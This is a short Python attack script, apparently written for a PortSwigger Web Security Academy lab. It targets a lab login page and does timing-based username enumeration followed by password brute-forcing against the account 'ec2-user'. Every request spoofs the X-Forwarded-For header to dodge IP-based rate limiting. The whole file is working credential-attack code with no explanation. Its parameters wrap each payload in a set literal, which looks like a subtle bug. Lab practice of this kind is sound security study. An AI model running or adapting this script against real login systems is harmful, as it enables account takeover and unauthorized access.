import requests
import time

# Define the URL
url = "https://0a0200e5039a80a49f06b4da0039002e.web-security-academy.net/login"  # Replace with the actual URL


def enumerator(url):
    wordlist_path = "usernames.txt"
    # Read the wordlist
    with open(wordlist_path, 'r') as file:
        payloads = file.read().splitlines()

    # Iterate over each payload in the wordlist
    counter = 1000
    maxx = 0
    for payload in payloads:
        counter += 1
        params = {f'username': {payload}, 'password': 'helllffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffflo'}
        start = time.time()
        response = requests.post(url, data=params, headers={"X-Forwarded-For": str(counter)})
        end = time.time()
        diff = end - start
        if response.status_code == 200:
            if maxx == 0:
                maxx = diff
            print(f" payload: {payload} | diff: {diff} | max is {maxx}| counter: {counter}")    
            maxx = max(diff, maxx)
        else:
            print(response.status_code)
    print(maxx)


def password(url):
    wordlist_path = "passwords.txt"
    # Read the wordlist
    with open(wordlist_path, 'r') as file:
        payloads = file.read().splitlines()

    # Iterate over each payload in the wordlist
    counter = 10000
    maxx = 0
    for payload in payloads:
        counter += 1
        params = {f'username': 'ec2-user', 'password': {payload}}
        start = time.time()
        response = requests.post(url, data=params, headers={"X-Forwarded-For": str(counter)})
        end = time.time()
        diff = end - start
        if response.status_code == 200:
            if maxx == 0:
                maxx = diff
            print(f" payload: {payload} | length: {len(response.text)} | diff: {diff} | max is {maxx}| counter: {counter}")    
            maxx = max(diff, maxx)
        else:
            print(response.status_code)
    print(maxx)

password(url)
